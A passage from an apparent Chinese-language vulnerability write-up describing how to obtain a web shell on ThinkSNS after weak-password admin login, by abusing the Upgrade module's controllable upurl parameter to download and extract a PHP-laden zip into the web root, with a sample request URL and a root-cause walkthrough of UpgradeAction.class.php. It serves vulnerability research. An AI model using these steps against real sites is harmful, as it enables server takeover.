### 6、ThinkSNS管理员弱口令后台GetShell

> 弱口令登录，后台getshell

![](upload/attach/202107/809626_5EGHJNCE3V5V2GX.jpg)

![](upload/attach/202107/809626_ATWQV6WCV5AUHPA.jpg)

> 漏洞复现地址：`http://xxx:port/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://xxx:port/test/UzJu.zip`

![](upload/attach/202107/809626_9QS9AT9KP98Z3KS.jpg)

> 由于配置问题，访问`/data/upgrade`就可以看到目录下的文件，`data`目录也是如此

![](upload/attach/202107/809626_EZW2D655HEPKAD5.jpg)

![](upload/attach/202107/809626_CKPD7AZ8E825FFE.jpg)

> 将数据包的`act`改成`setp2`和`upurl`改成`filename=UzJu.zip`

![](upload/attach/202107/809626_SE98VK4QUHFWER8.jpg)

![](upload/attach/202107/809626_V8ASPFW8Y3DFWV2.jpg)

![](upload/attach/202107/809626_4U7XG5ZPW3P5DF4.jpg)

> 然后去访问这个Php

![](upload/attach/202107/809626_ZS6XSCDF48YN8VY.jpg)

![image-20210415212408508](upload/attach/202107/809626_RYT6TMCKNBEEPHF.jpg)

> 然后正常获取权限就行，以下是漏洞代码的位置
>
> 漏洞代码发生在路径`/apps/admin/lib/Action/UpgradeAction.class.php`文件。

![](upload/attach/202107/809626_3KF43PBR6YVWYCW.jpg)

> 46行处，升级时调用`check`函数升级通过`C('UPURL').'?v='.C('VERSION')`获取升级链接

![](upload/attach/202107/809626_SBGYKZPBD4FKBFK.jpg)

> 在169行，直接再次调用且`upurl`可控，覆盖之前的`&upurl`远程升级下载包含`.php`的`UzJu.zip`压缩包先下载再校验，存在逻辑问题，直接构造url payload下载。此为漏洞的引发起始点，再往下看在226行处`step2`，`Step2`解压也存在问题未进行校验文件就进行解压到网站根目录

![image-20210416080517746](upload/attach/202107/809626_GG7AK8JJXWV9W8B.jpg)
